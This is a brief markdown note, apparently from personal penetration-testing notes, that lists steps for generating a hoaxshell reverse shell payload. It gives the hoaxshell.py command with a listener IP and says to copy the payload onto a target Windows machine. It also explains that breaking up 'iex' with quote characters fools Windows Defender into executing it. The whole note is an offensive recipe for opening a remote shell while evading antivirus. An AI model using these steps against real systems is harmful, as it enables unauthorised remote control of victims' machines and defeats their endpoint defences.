## Create Reverse Shell Payload Via Hoaxshell
1) `hoaxshell.py -s IP_ADD -r -H "Authorization"`
2) Copy payload from kali into target
3) Obfuscate before executing command in target windows cmd line
4) ![image](https://user-images.githubusercontent.com/55113729/214117555-0a496ab7-25f5-4d8e-861e-67cec5c1b353.png)
5) Adding `'` in between `iex` helps to trick windows defender into thinking this is a regular, safe command and NOT a payload, allowing for execution into hoaxshell rev shell
6) Enjoy!
